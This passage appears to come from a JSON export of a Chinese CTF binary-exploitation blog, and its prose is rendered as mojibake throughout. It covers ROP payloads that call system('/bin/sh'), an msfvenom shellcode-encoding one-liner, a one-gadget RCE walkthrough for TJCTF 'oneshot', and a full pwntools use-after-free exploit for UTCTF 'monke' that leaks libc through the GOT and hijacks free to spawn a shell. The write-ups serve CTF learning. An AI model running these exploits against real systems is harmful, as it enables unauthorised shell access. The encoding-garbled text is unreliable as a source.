ˆçš„çŠ¶æ€å‘ç”Ÿäº†æ”¹å˜ï¼Œæ‰€ä»¥éœ€è¦é‡æ–°è®¡ç®—ä¸€ä¸‹ã€‚å› ä¸ºå†æ¬¡è¿›å…¥mainå‡½æ•°æ„é€ å‡ºæ¥çš„Mainå‡½æ•°æ ˆåº”è¯¥æ˜¯0x40ï¼Œè€Œä¸æ˜¯ä¹‹å‰0x48è¿™ä¹ˆå¤§äº†ï¼Œæ²¡æœ‰ç»è¿‡startå‡½æ•°åˆå§‹åŒ–mainå‡½æ•°æ ˆï¼Œä¸å­˜åœ¨å‹å…¥çš„å…¨å±€åç§»ï¼Œç³»ç»Ÿåªæ˜¯å°†è¿™æ¬¡çš„mainå‡½æ•°å½“ä½œä¸€ä¸ªæ™®é€šçš„å‡½æ•°æ¥æ„é€ æ ˆã€‚\n\næ‰€ä»¥è¿™ä¸€æ¬¡æˆ‘ä»¬è¾“å…¥çš„å†…å®¹è·ç¦»æ ˆåº•å°±ç¡®å®åªæœ‰0x28è¿™ä¹ˆè¿œäº†ï¼Œé‚£ä¹ˆè®¡ç®—ä¸€ä¸‹0x28+0x04=0x2cï¼Œæ‰€ä»¥è¿™ä¸€æ¬¡çš„paddingå°±æ˜¯0x2cã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nshellcode2 = 'B'*0x2c\t#padding\nshellcode2 += system_addr #è·³è½¬åˆ°systemå‡½æ•°ä»¥æ‰§è¡Œsystem(\"/bin/sh\")\nshellcode2 += main_addr # systemå‡½æ•°è¿”å›åœ°å€ï¼Œéšä¾¿å¡«\nshellcode2 += binsh_addr #systemå‡½æ•°çš„å‚æ•°\n```\n\n \n\nâ–²ç¬¬äºŒç§ï¼šå°†scanfçš„è¿”å›åœ°å€æ‹¿æ¥åšæ–‡ç« ï¼Œé€šè¿‡ropå°†espç›´æ¥ä¸‹æ‹‰ä¸¤ä¸ª0x04åˆ°è¾¾æˆ‘ä»¬è¾“å…¥çš„systemï¼Œç„¶ååœ¨ä»ä¹‹åçš„åœ°æ–¹è¯»å–binshå­—ç¬¦ä¸²ï¼Œä¸€æ¬¡payloadç›´æ¥æå®šï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191551712.png)\n\né€šè¿‡æ±‡ç¼–ä»£ç å¯ä»¥çœ‹åˆ°ï¼Œè°ƒç”¨scanfæ—¶çš„æ ˆçŠ¶æ€åº”è¯¥è·Ÿä¸‹å›¾ä¸€æ ·ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191551658.png)\n\næ‰€ä»¥æˆ‘ä»¬scanfå‡½æ•°è¿”å›æ—¶espåº”è¯¥è¿˜æ˜¯æŒ‡å‘çš„formatå‚æ•°åœ°å€æ‰å¯¹ï¼Œé‚£ä¹ˆä¸ºäº†å°†espä¸‹æ‹‰ä¸¤ä¸ª0x04ï¼Œåˆ°è¾¾è¾“å…¥çš„systemå‡½æ•°åœ°å€ï¼Œå°±éœ€è¦ä¸¤ä¸ªPopæ“ä½œï¼Œè¿™é‡Œé€šè¿‡ROPgadgetå¯ä»¥æŸ¥å‡ºæ¥ï¼Œæˆ–è€…ç›´æ¥ä»initä»€ä¹ˆçš„åˆå§‹åŒ–æ®µä¸­æ‰¾ä¸‡èƒ½gadgetï¼ŒåŒæ ·å­˜åœ¨å¤šä¸ªPopæ“ä½œã€‚é‚£ä¹ˆè¿™æ ·çš„åŒ–å°±åªæœ‰ä¸€æ¬¡payloadï¼Œæ‰€ä»¥æ€»çš„payloadå°±åº”è¯¥æ˜¯ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nshellcode1 = 'A'*0x34 #padding\nshellcode1 += scanf_addr # è°ƒç”¨scanfä»¥ä»STDINè¯»å–\"/bin/sh\"å­—ç¬¦ä¸²\nshellcode1 += pop_pop_ret_addr# scanfè¿”å›ååˆ°ä¸¤ä¸ªPopæ“ä½œå¤„\nshellcode1 += format_s # scanfå‚æ•°\nshellcode1 += binsh_addr #ä½œä¸ºscanfçš„å‚æ•°è¯»å–binshå­—ç¬¦ä¸²\nshellcode1 += system_addr # \"/bin/sh\"å­—ç¬¦ä¸²æ‰€åœ¨åœ°å€\nshellcode1 += binsh_addr #ä½œä¸ºsystemçš„å‚æ•°getshell\n```\n\nâ–²è¿™é‡Œå†ç»™å‡ºç¬¬ä¸‰ç§æ–¹æ¡ˆï¼Œä¹Ÿæ¯”è¾ƒå®¹æ˜“ç†è§£\n\nè¿™ä¸ªæ–¹æ¡ˆæ˜¯åŸºäºç¬¬ä¸€ç§çš„ï¼Œè¦†ç›–scanfè¿”å›åœ°å€ä¸ºstartå‡½æ•°ï¼Œè¿™æ ·mainå‡½æ•°æ ˆåˆé‡æ–°åˆå§‹åŒ–ï¼Œç›¸å½“é‡æ–°æ‰§è¡Œä¸€æ¬¡ç¨‹åºï¼Œé‚£ä¹ˆç¬¬äºŒæ¬¡çš„shellcodeçš„paddingå­—ç¬¦ä¸ªæ•°è¿˜æ˜¯0x34ä¸ªAï¼Œä¹‹åå°±å¸¸è§„è¦†ç›–eipè·³è½¬systemå‡½æ•°getshelläº†ã€‚ä½†æ˜¯è¿™é‡Œç›´æ¥å†™startå‡½æ•°çš„é¦–åœ°å€ä¼šå‡ºé”™ï¼Œå› ä¸ºè¿™é‡Œçš„starté¦–åœ°å€ä¸º0x08048420ï¼Œæœ«å°¾ä¸º20ï¼Œè½¬åŒ–æˆå­—ç¬¦ä¸²å°±æ˜¯ç©ºæ ¼ã€‚è€Œè¯»å…¥æˆ‘ä»¬è¾“å…¥çš„åˆæ˜¯scanfï¼Œscanfä¸æ”¯æŒç©ºæ ¼å½•å…¥ï¼Œæ‰€ä»¥é‡åˆ°ç©ºæ ¼å°±ä¼šå‘ç”Ÿæˆªæ–­ï¼Œå¯¼è‡´è¯»ä¸è¿›å»ã€‚è€Œè¿™é‡Œåˆæ˜¯å› ä¸ºå¤§ç«¯åºï¼Œå¦‚æœå‘ç”Ÿ0x08048420ï¼Œé‚£ä¹ˆå…ˆå‘é€çš„å­—ç¬¦æ˜¯0x20ï¼Œä¹Ÿå°±æ˜¯ç©ºæ ¼ï¼Œé‚£ä¹ˆå°±ç›´æ¥æˆªæ–­ï¼Œä¹‹åæ‰€æœ‰æ•°æ®éƒ½è¯»ä¸äº†äº†ã€‚æ‰€ä»¥è¿™é‡Œå¦‚æœéœ€è¦ä¼ å…¥startå‡½æ•°ï¼Œåˆ™å°†startå‡½æ•°ä¸‹æ‹‰ä¸¤ä¸ªå­—èŠ‚ï¼Œä¼ å…¥0x08048422ã€‚çœ‹æ±‡ç¼–ä»£ç ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191551445.jpeg)\n\nstartå‡½æ•°ä½“çš„ç¬¬ä¸€æ¡æ±‡ç¼–æŒ‡ä»¤æ˜¯xor ebp,ebpã€‚å¼‚æˆ–æ“ä½œï¼Œå°±æ˜¯å°†ebpæ¸…ç†å¥½åˆå§‹åŒ–è€Œå·²ï¼Œå•¥ç”¨ä¹Ÿæ²¡æœ‰ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è·³è¿‡ï¼Œåˆ°pop esiå°±è¡Œã€‚å…·ä½“ä»£ç å°±æ˜¯å°†ç¬¬ä¸€ç§æ–¹æ¡ˆçš„ç§ç¬¬ä¸€æ®µshellcodeçš„main_addræ”¹æˆstart_addr+0x02ï¼Œç„¶ååç§»éƒ½æ˜¯0x34å°±è¡Œã€‚\n\n \n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\nhttps://www.cnblogs.com/sweetbaby/p/14148625.html\n\n \n","tags":["ROP"],"categories":["PWN","ROP0x3"]},{"title":"Shellcodeæ±‡æ€»","url":"/2021/08/14/ShellCodeæ±‡æ€»/","content":"\n# ä¸€ã€shellcodeçš„æŸ¥æ‰¾å’Œè·å–ï¼š\n\n- åœ°å€ï¼šhttp://shell-storm.org/shellcode/\n\n- è·å–æ–¹å¼ï¼šå¯ä»¥é€šè¿‡linux/x86/sh/bash/execve/shellcodeç­‰ç­‰å…³é”®è¯æ¥æŸ¥æ‰¾\n\n \n\n# äºŒã€shellcodeçš„ç¼–ç ï¼š\n\nç¤ºä¾‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\npython -c 'import sys; sys.stdout.write(\"\\x31\\xc9\\xf7\\xe1\\xb0\\x0b\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\")' | msfvenom -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufferRegister=EAX -o payload\n```\n\n- â€™import sys; sys.stdout.write(â€œshellcodeâ€)â€™ï¼šè¿™æ˜¯å¯¼å…¥åŒ…ä¹‹åå†™å…¥ç¼–ç çš„shellcodeã€‚\n\n- ç”±äºmsfvenomåªèƒ½ä»stdinä¸­è¯»å–ï¼Œæ‰€ä»¥ä½¿ç”¨Linuxç®¡é“ç¬¦â€|â€æ¥ä½¿å¾—shellcodeä½œä¸ºpythonç¨‹åºçš„è¾“å‡ºã€‚\n\n- æ­¤å¤–é…ç½®ç¼–ç å™¨ä¸ºx86/alpha_mixedï¼Œé…ç½®ç›®æ ‡å¹³å°æ¶æ„ç­‰ä¿¡æ¯ï¼Œè¾“å‡ºåˆ°æ–‡ä»¶åä¸ºpayloadçš„æ–‡ä»¶ä¸­ã€‚\n\n- Shellcodeçš„æ‰§è¡Œæ¡ä»¶ä¸€èˆ¬éƒ½æ˜¯call Registerï¼Œè¿™é‡Œçš„BufferRegisterè®¾ç½®æ˜¯å› ä¸ºé€šè¿‡æŒ‡ä»¤call eaxè°ƒç”¨shellcode,æ‰€ä»¥é…ç½®BufferRegister=EAXã€‚æœ€åå³å¯åœ¨payloadä¸­çœ‹åˆ°å¯¹åº”çš„è¢«ç¼–ç åçš„ä»£ç ã€‚\n\n \n\n# ä¸‰ã€shellcodeçš„ä¸¤æ®µæ‰§è¡Œï¼š\n\n- éœ€è¦æ³„éœ²RWXæ®µçš„åœ°å€ï¼Œè¯»å–æ³„éœ²åœ°å€ï¼š\n\n- éœ€è¦è·³è½¬jmpå‘½ä»¤æˆ–è€…æ˜¯return/callï¼Œä½†æ˜¯returnä¼špop eipï¼Œcallä¼špush eipï¼Œéƒ½ä¼šä¿®æ”¹æ‰æ ˆä¸­çš„å†…å®¹ã€‚å¦‚æœshellcodeçš„ä¸¤æ®µæ‰§è¡Œè®¡ç®—åç§»åœ°å€çš„è¯ï¼Œå¯èƒ½éœ€è¦å°†è¿™ä¸¤ä¸ªå†…å®¹ä¹Ÿè®¡ç®—è¿›å…¥ã€‚ä½†æ˜¯jmpå°±ä¸ä¼šéœ€è¦ï¼Œæ˜¯ç›´æ¥æ— æ¡ä»¶è·³è½¬ï¼Œæ‰€ä»¥å¤§å¤šæ—¶å€™é€‰æ‹©jmpæ¯”è¾ƒå¥½ã€‚\n\n \n\n \n","tags":["Fmstr"],"categories":["PWN","Shellcode0x2"]},{"title":"TJCTF 2016-oneshot","url":"/2021/08/14/TJCTF 2016-oneshot/","content":"\n \n\n1.å¸¸è§„checksecï¼Œåªå¼€äº†NXï¼Œç„¶åIDAæ‰“å¼€æ‰¾æ¼æ´ã€‚å‘ç°æ‰¾ä¸åˆ°ä»€ä¹ˆæ¼æ´ï¼Œä½†æ˜¯æœ‰ä¸ªå¾ˆå¥‡æ€ªçš„åœ°æ–¹\n\n```\n#æ³¨é‡Šå¤´\n\n__int64 (__fastcall *v4)(const char *); // [rsp+8h] [rbp-8h]\n---------------------------------------------------------------------------\n__isoc99_scanf(\"%ld\", &v4);\n-------------------------------------------------------------------------\nreturn v4(\"Good luck!\");\n```\n\næŸ¥çœ‹åæ±‡ç¼–ä»£ç åå‘ç°ä¼šæœ‰è¿™ä¹ˆä¸€ä¸²ä»£ç ï¼Œv4æ˜¯æˆ‘ä»¬è¾“å…¥çš„ä¸œè¥¿ï¼Œå´è¢«ä»¥å‡½æ•°å½¢å¼è°ƒç”¨ã€‚åœ¨æ±‡ç¼–çª—å£ä¸­çœ‹ä¸‹ï¼Œå‘ç°call putså‡½æ•°ä¹‹åçš„ä»£ç å½¢å¼æ˜¯è¿™æ ·çš„ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nvar_8 = qword ptr -8\n--------------------------------------------------------\nmov  rax, [rbp+var_8]\nmov  rdx, rax\nmov  eax, 0\ncall rdx\n```\n\nä¹Ÿå°±æ˜¯æŠŠæˆ‘ä»¬è¾“å…¥çš„ä¿å­˜åœ¨var_8é‡Œçš„å†…å®¹ï¼Œç»™äº†rax,raxåˆç»™äº†rdxï¼Œä¹‹åcall rdxã€‚ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„ä¸œè¥¿æœ€åä¼šè¢«å½“åˆä»£ç æŒ‡ä»¤æ¥æ‰§è¡Œã€‚\n\n2.ç¨‹åºä¸å­˜åœ¨æ ˆæº¢å‡ºï¼Œè¾“å…¥åªèƒ½æ˜¯4ä¸ªå­—èŠ‚ï¼Œå·²ç»è§„å®šå¥½äº†ã€‚%ldä»£è¡¨long intï¼Œå››ä¸ªå­—èŠ‚ï¼Œç¨‹åºåˆæ²¡æœ‰ä¸€æ¬¡getshellçš„åé—¨å‡½æ•°ï¼Œæ‰€ä»¥å°±åªèƒ½é è¿™4ä¸ªå­—èŠ‚æ¥getshellã€‚\n\n3.è¿™é‡Œè€ƒè™‘ä½¿ç”¨one gadget RCEæ¥ä¸€æ­¥getshellï¼Œé¦–å…ˆåœ¨Linuxä¸‹æŸ¥æ‰¾ä¸€ä¸‹é¢˜ç›®ç»™çš„libcä¸­æœ‰æ²¡æœ‰onegadget:\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191550001.jpeg)\n\n4.è¿™æ ·å°±å¯ä»¥é€šè¿‡ä¸€æ¬¡è·³è½¬æ¥getshellï¼Œä½†æ˜¯ç¬¬ä¸€æ¡æœ‰é™åˆ¶æ¡ä»¶ï¼Œç”±äºæ±‡ç¼–ä»£ç ä¸­åœ¨call rdxä¹‹å‰æœ‰mov eax,0;å³raxå°±ç­‰äº0ã€‚(eaxåœ¨64ä½ç¨‹åºä¸‹å°±æ˜¯raxçš„ä½32ä½)æˆ–è€…å…ˆè°ƒè¯•çœ‹çœ‹èƒ½ä¸èƒ½æ»¡è¶³æ¡ä»¶ï¼Œç»è¿‡è°ƒè¯•å‘ç°æ‰§è¡Œåˆ°call rdxæ—¶rax = 0ï¼Œä¹Ÿæ»¡è¶³è¦æ±‚ï¼Œé‚£ä¹ˆå°±å°è¯•å†™payloadã€‚\n\n5.æœ¬åœ°ä¸­é¦–å…ˆéœ€è¦è¿æ¥åˆ°æŒ‡å®šçš„åº“æ–‡ä»¶ä¸­ï¼Œå¯ä»¥å…ˆåœ¨linuxä¸­ldd libcåº“æ–‡ä»¶æ¥çœ‹é¢˜ç›®ç»™çš„åº“æ–‡ä»¶æ˜¯ä»€ä¹ˆç‰ˆæœ¬ï¼Œä¹‹åä¿®æ”¹è¿™æ®µä»£ç è®©processèƒ½å¤Ÿè¿æ¥åˆ°æŒ‡å®šç‰ˆæœ¬çš„libcæ–‡ä»¶ã€‚(åˆ©ç”¨pwndockerï¼Œæˆ–è€…è‡ªå·±ä¸‹ä¸ªå¯¹åº”ç‰ˆæœ¬çš„ubuntuâ€”dockerï¼Œç„¶åå®‰è£…pythonä¹‹ç±»çš„)\n\nio = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './tvstation'], env={\"LD_PRELOAD\":\"./libc.so.6_x64\"})\n\n6.ç”±äºä¸çŸ¥é“onegadgetè¢«libcåŠ è½½è¿›å…¥ä¹‹åæ˜¯åœ¨ä»€ä¹ˆåœ°å€ï¼Œæ‰€ä»¥ç°åœ¨è¿˜éœ€è¦æ³„éœ²ä¸€ä¸ªåœ°å€ï¼Œåˆšå¥½ç¨‹åºä¸­æœ‰ä¸¤ä¸ªisoc99_scanfï¼Œç¬¬ä¸€ä¸ªå¯ä»¥ç”¨æ¥è¾“å…¥æŸä¸ªå‡½æ•°.gotè¡¨ä¸­onegadgetçš„åœ°å€ï¼Œç„¶åç¨‹åºä¼šæ‰“å°å‡ºæ¥è¯¥å‡½æ•°çœŸå®åœ°å€ï¼Œå¯¹åº”ä»£ç ä¸ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n__isoc99_scanf(\"%ld\", &v4);\nprintf(\"Value: 0x%016lx\\n\", *(_QWORD *)v4);\n```\n\nä½†æ³¨æ„è¾“å…¥çš„æ ¼å¼ã€‚ç”±äºè¾“å…¥æ ¼å¼ä¸º__isoc99_scanf(\"%ld\", &v4)ä¸­çš„ldï¼Œä¹Ÿå°±æ˜¯åè¿›åˆ¶æœ‰ç¬¦å·é•¿æ•´å‹ï¼Œ(l=longå‹ï¼Œd=Decimalä¹Ÿå°±æ˜¯åè¿›åˆ¶)æ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†è¯¥åœ°å€è½¬åŒ–ä¸ºåè¿›åˆ¶æ•°ç„¶åè¾“å…¥ï¼Œå› ä¸ºscanfæ ¼å¼è§„å®šäº†ï¼Œä¹‹åæ‰“å°çš„æ ¼å¼æ˜¯%016lxï¼Œå…¶ä¸­xä»£è¡¨Hexadecimalï¼Œä¹Ÿå°±æ˜¯16è¿›åˆ¶ï¼Œ16ä»£è¡¨æ€»å…±è¾“å‡º16ä½ï¼Œ0ä»£è¡¨ä¸è¶³16ä½åˆ™é«˜ä½è¡¥é›¶ã€‚(å¦‚æœä¸çŸ¥é“å¯ä»¥æ‹¿visualstudioæµ‹è¯•ä¸€ä¸‹å°±å¯ä»¥)\n\n7.æ‰€ä»¥ç¬¬ä¸€æ¬¡è¾“å…¥åº”è¯¥ä¸ºæŸä¸ªå‡½æ•°åœ°å€å¯¹åº”çš„åè¿›åˆ¶ï¼Œè¿™é‡Œé€‰å–setbufå‡½æ•°ï¼Œå› ä¸ºsetbufå‡½æ•°åˆšå¥½åœ¨.got.pltè¡¨ä¸­ï¼ŒåŒæ—¶ä¹Ÿä»å¤–éƒ¨å¼•ç”¨ï¼Œåœ¨externä¹Ÿæœ‰ï¼Œåå…­è¿›åˆ¶åœ°å€ä¸ºï¼š0x600ae0(è¿™é‡Œé€‰ç”¨puts,printf,ç”šè‡³__libc_start_mainä¹Ÿè¡Œï¼Œåªè¦æ»¡è¶³åœ¨.got.pltè¡¨ä¸­å’Œexternè¡¨ä¸­)ä¹Ÿå°±æ˜¯6294240ï¼Œå³io.sendline(â€œ6294240â€)ã€‚è¿™æ ·å°±å¯ä»¥æ‰“å°å‡ºsetbufå‡½æ•°è¢«åŠ è½½è¿›å†…å­˜çš„åœ°å€ï¼Œä¹‹åè·å–è¿™ä¸ªåœ°å€ï¼Œå…ˆæ¥æ”¶io.recvuntil(\"Value: \")ï¼Œä½¿å¾—æ¥ä¸‹æ¥æ‰“å°çš„æ˜¯setbufçš„å†…å­˜åœ°å€ï¼Œä¹‹åä½¿ç”¨\n\nsetbuf_memory_addr = int(io.recv()[:18], 16)\n\nè¡¨ç¤ºæ€»å…±æ¥æ”¶18ä¸ªå­—ç¬¦ï¼Œä¹‹åä»¥16è¿›åˆ¶å½¢å¼è½¬åŒ–ä½intï¼Œ10è¿›åˆ¶å½¢å¼ã€‚è¿™é‡Œæ€»å…±åº”è¯¥ä¼šæ‰“å°18ä¸ªå­—ç¬¦ï¼Œ16+0xï¼Œä¹Ÿå°±æ˜¯18ä¸ªã€‚\n\n8.ä¹‹åè®¡ç®—åç§»é‡ï¼Œå¾—åˆ°one_gadget_rceåœ¨å†…å­˜ä¸­çš„åœ°å€å³å¯ï¼šæ³¨æ„è¦è½¬åŒ–ä¸ºstrå­—ä¸²å½¢å¼å‘é€\n\nio.sendline(str(setbuf_memory_addr - (setbuf_addr_libc - one_gadget_rce_libc)))\n\n9.æœ€åio.interactive()å³å¯getshellã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n","tags":["ROP"],"categories":["PWN","ROP0x3"]},{"title":"UTCTFèµ›åå¤ç°","url":"/2021/08/14/UTCTFèµ›åå¤ç°/","content":"\nè¿™æ¬¡æ¯”èµ›åšäº†ä¸¤é“é¢˜ä¹‹åå°±æ²¡æ€ä¹ˆçœ‹äº†ï¼Œå¿™å…¶ä»–çš„å»äº†ã€‚è¿™é‡Œä¸»è¦å¤ç°ä¸€ä¸‹å¦ä¸€é“é¢˜ï¼Œmonkeã€‚åšè¿™é“é¢˜çš„æ—¶å€™ä¼°è®¡è„‘å­æŠ½é£äº†ï¼Œå±…ç„¶æ²¡çœ‹è¿˜æœ‰ä¸€ä¸ªéšè—é€‰é¡¹åœ¨IDAä¸­æ˜æ˜ç™½ç™½åœ°æ˜¾ç¤ºç€ï¼Œè‡ªå·±å±…ç„¶æ²¡å‘ç°ï¼Œå¯¼è‡´å•¥æ¼æ´éƒ½æ‰¾ä¸å‡ºæ¥ã€‚\n\nä¸€ã€MONKEå¤ç°ï¼š\n\n1.å¸¸è§„IDAï¼Œchecksecä¸€ä¸‹ï¼Œåªå¼€äº†NXã€‚æ¼æ´ç‚¹åœ¨Freeæ¨¡å—å’Œéšè—é€‰é¡¹ï¼š\n\nFreeæ¨¡å—\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191457777.png)\n\néšè—é€‰é¡¹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191457778.png)\n\nå¯ä»¥çœ‹åˆ°å½“freeçš„æ—¶å€™ï¼Œä¼šå¯¹can_eatè¿™ä¸ªå…¨å±€å˜é‡è¿›è¡Œåˆ¤æ–­ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\n\ncan_eaté»˜è®¤ä¸º1\n------------------------------------------------------------------------------\nif ( can_eat )\n    inventory[edit_idx] = 0LL;\n```\n\nå¦‚æœä¸º1ï¼Œåˆ™å°†æŒ‡é’ˆç½®é›¶ï¼Œå¦åˆ™å°±ä¸ç½®é›¶ã€‚è¿™æ ·å°±ä¼šé€ æˆç®¡ç†bananaçš„inventory[idx]æŒ‡é’ˆæ‚¬ç©ºï¼Œå†åŠ ä¸Šé€‰é¡¹2å¯ä»¥renameä¿®æ”¹å†…å®¹ï¼Œç›´æ¥é€ æˆUAFæ¼æ´ã€‚åŒæ—¶ï¼Œç”±äºè¿™é‡Œæ˜¯é€šè¿‡ç»“æ„ä½“inventoryæ¥ç®¡ç†bananaï¼Œç»“æ„ä½“å¦‚ä¸‹ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\n00000000 inventory struc ; (sizeof=0x10, mappedto_4)\n00000000 banana dq ?\n00000008 name_size dq ?\n00000010 inventory ends\n```\n\næ‰“å°å†…å®¹çš„æ—¶å€™æ˜¯é€šè¿‡inventory[idx]->bananaæ¥æ‰“å°çš„ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥æŠŠbananaçš„æŒ‡é’ˆæŒ‡å‘gotè¡¨ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ‰“å°å‡ºgotè¡¨ä¸­å‡½æ•°çš„çœŸå®åœ°å€ï¼Œä»è€Œæ³„éœ²å‡ºlibcåŸºåœ°å€ï¼Œè¿™æ ·é€šè¿‡libcåŸºåœ°å€å’ŒUAFæ¼æ´ç›´æ¥åŠ«æŒfreeå‡½æ•°ï¼Œæ„é€ system(\"/bin/sh\")å³å¯ã€‚\n\nâ–²æ€è€ƒå¦‚ä½•å°†bananaæŒ‡é’ˆæŒ‡å‘gotè¡¨ï¼šæ¼æ´ç‚¹åŒæ ·ä¹Ÿåœ¨freeå‡½æ•°ï¼Œç”±äºåœ¨mallocæ—¶ä¼šç”³è¯·ä¸€ä¸ª0x20å¤§å°çš„chunkæ¥å­˜æ”¾bananaçš„åœ°å€å’Œsizeï¼Œç”¨æ¥ç®¡ç†bananaã€‚ä½†æ˜¯åœ¨freeçš„æ—¶å€™å´æ²¡æœ‰freeæ‰è¿™ä¸ª0x20å¤§å°çš„chunkã€‚\n\n(1)å…ˆç”³è¯·ä¸€ä¸ª0x20å¤§å°çš„banana0ï¼Œè¿›å…¥éšè—é€‰é¡¹ï¼Œç„¶åfreeæ‰ï¼Œbanana0è¿›å…¥tcacheä¸­ï¼Œä½†æ˜¯inventory[0]å¹¶æ²¡æœ‰è¢«ç½®0ã€‚\n\n(2)å†ç”³è¯·ä¸€ä¸ª0x20å¤§å°çš„banana1ï¼Œå°†banan0ç”³è¯·å›æ¥ï¼Œè¿™æ—¶ç®¡ç†banana1çš„chunkå°±å˜æˆäº†banan0ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡inventory[0]æ¥ä¿®æ”¹banan0ä»è€Œä¿®æ”¹ç®¡ç†banan1çš„chunkï¼Œä½¿å¾—åŸæœ¬æŒ‡å‘banan1çš„æŒ‡é’ˆæŒ‡å‘freeçš„gotè¡¨ã€‚\n\n(3)ä¹‹åå†é€šè¿‡é€‰é¡¹2ï¼Œå°±å¯ä»¥æ‰“å°inventory[0].banana1çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯freeçš„gotè¡¨ä¸­çš„çœŸå®åœ°å€ã€‚\n\n2.å¼€å§‹ç¼–å†™exp:\n\n(1)é¦–å…ˆæ³„éœ²åŸºåœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfind_banana(\"a\", 4)\n\n#è·³è½¬è‡³éšè—é€‰é¡¹ï¼Œå°†can_eatç½®é›¶ã€‚\nwalk(\"0\")\n\n#åƒæ‰é¦™è•‰ï¼Œä½¿å¾—banana0è¿›å…¥tcacheä¸­ï¼Œæ–¹ä¾¿ä¹‹åç”³è¯·å›æ¥ï¼ŒåŒæ—¶inventory[0]æ²¡æœ‰ç½®é›¶ã€‚\neat(0)\n\n#ç”³è¯·banana1ï¼Œå°†banana0ç”³è¯·å›æ¥ï¼Œä½¿å¾—ç®¡ç†banana1çš„chunkå˜æˆbanana0ï¼Œæ–¹ä¾¿ä¹‹åä¿®æ”¹ã€‚\nfind_banana(\"b\", 8)\n\n#å°†*(inventory[0].banana)ä¿®æ”¹ä¸ºfreeçš„gotè¡¨\nrename(0, p64(elf.got[\"free\"]))\nsh.sendline(\"s\")\nskip_menu()\n\n# å±•ç¤ºinventoryï¼Œä»inventory[0].bananaå¯¹åº”çš„å†…å­˜ä¸Šæ³„éœ²åœ°å€\nsh.sendline(\"2\")\nsh.recvline()\nsh.recvline()\nfree = u64(sh.recvline()[3:].strip().ljust(8, b\"\\x00\"))\n\n#è®¡ç®—å¾—åˆ°libcåŸºåœ°å€ï¼š\nlibc.address = free - libc.symbols[\"free\"]\nlog.info(f\"libc base leaked @ 0x{libc.address:x}\")\n```\n\n(2)åŠ«æŒfreeå‡½æ•°ä¸ºsystemå‡½æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n#æ­¤æ—¶inventory[1].bananaçš„å€¼åº”è¯¥æ˜¯freeçš„gotè¡¨ï¼Œé‚£ä¹ˆæ­¤æ—¶ä¿®æ”¹\n#inventory[1].banana.contentå°±ä¼šç›´æ¥ä¿®æ”¹freeçš„gotè¡¨ï¼Œä»è€ŒåŠ«æŒå‡½æ•°\nsh.sendline(\"1\")\nsh.recvline()\nsh.sendline(\"rename\")\nsh.recvline()\nsh.sendline(p64(libc.symbols[\"system\"]))\n```\n\n(3)å†ç”³è¯·ä¸€ä¸ªå†…å®¹ä¸º/bin/shå­—ç¬¦ä¸²çš„chunkï¼Œé‡Šæ”¾æ‰å³å¯getshellï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfind_banana(\"/bin/sh\", 10)\neat(2, True)\nsh.interactive()\n```\n\n(4)å‰ç½®å‡½æ•°ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nelf = ELF(\"./monke\")\nlibc = ELF(\"./libc-2.27.so\")\nsh = elf.process()\n#sh = remote(\"pwn.utctf.live\", 9999)\n\n\ndef skip_menu():\n    global sh\n    sh.recvuntil(\"2: inventory\\n\")\n    return bool(sh.recvline(timeout=0.5))\n\ndef walk(where=\"s\"):\n    global sh\n    sh.sendline(\"0\")\n    sh.sendlineafter(\"[n|s|e|w]\", where)\n    return skip_menu()\n\n\ndef find_banana(name, length):\n    global sh\n    while not walk():\n        pass\n    sh.sendline(\"3\")\n    sh.sendlineafter(\"How long would you like the name to be:\", str(length))\n    sh.sendlineafter(\"What would you like to name it:\", name)\n    skip_menu()\n\n\ndef eat(idx, end = False):\n    sh.sendline(\"2\")\n    sh.recvline()\n    while bool(sh.recvline(timeout=0.5)):\n        pass\n    sh.sendline(str(idx))\n    sh.recvline()\n    sh.sendline(\"eat\")\n    sh.recvline()\n    if not end:\n        skip_menu()\n\ndef rename(idx, name):\n    sh.sendline(\"2\")\n    sh.recvline()\n    while bool(sh.recvline(timeout=0.5)):\n        pass\n    sh.sendline(str(idx))\n    sh.recvline()\n    sh.sendline(\"rename\")\n    sh.recvline()\n    sh.sendline(name)\n    skip_menu()\n```\n\n \n\näºŒã€functionalprogrammingï¼š\n\n1.å¸¸è§„IDAï¼Œchecksecåˆ†æï¼ŒRELROæ²¡å¼€ã€‚ç¨‹åºæœ¬èº«å¾ˆç®€å•ï¼Œè¾“å…¥functionï¼Œparameterå’Œelementå¯ä»¥æ„é€ 